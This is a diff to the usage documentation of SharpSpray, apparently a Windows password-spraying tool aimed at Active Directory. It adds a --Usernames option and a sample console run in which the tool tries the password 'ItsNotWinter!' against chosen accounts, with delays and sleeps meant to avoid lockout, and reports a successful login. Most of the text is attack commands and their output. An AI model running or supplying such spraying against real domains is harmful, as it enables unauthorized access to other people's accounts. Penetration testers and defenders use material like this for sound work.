@@ -15,6 +15,7 @@ SharpSpray.exe
       --Passwords [ A comma-separated list of passwords to use instead of the internal list generator. Eg. Password1,Password19,Company19,Welcome19 ]
       --Delay [ The delay time between guesses in millisecounds. Eg. 300 ]
       --Sleep [ The number of minutes to sleep between password cycles. Eg. 15 ]
+      --Usernames [ A comma-seperated list of usernames to use instead of the automated collection of usernames ]
 
 C:\Users\jnqpblc\Desktop>SharpSpray.exe --Sleep 15
 [+] Successfully collected 42 usernames from Active Directory.
@@ -45,6 +46,17 @@ C:\Users\jnqpblc\Desktop>SharpSpray.exe --Passwords ItsNotWinter! --Sleep 15 --D
 [*] Using a delay of 300 milliseonds between attempts.
 [*] Using password ItsNotWinter!
 [+] Successfully authenticated with jnqpblc::ItsNotWinter!
+[*] Completed all rounds with password ItsNotWinter!
+[*] Now the script will sleep for 15 minutes.
+^C
+
+C:\Users\jnqpblc\Desktop>SharpSpray.exe --Passwords ItsNotWinter! --Sleep 15 --Delay 300 --Usernames Fawaz,Admin
+[+] Successfully collected 2 usernames from User input.
+[+] Successfully generated a list of 1 passwords.
+[*] Starting password spraying operations.
+[*] Using a delay of 300 milliseonds between attempts.
+[*] Using password ItsNotWinter!
+[+] Successfully authenticated with Fawaz::ItsNotWinter!
 [*] Completed all rounds with password ItsNotWinter!
 [*] Now the script will sleep for 15 minutes.
 ^C
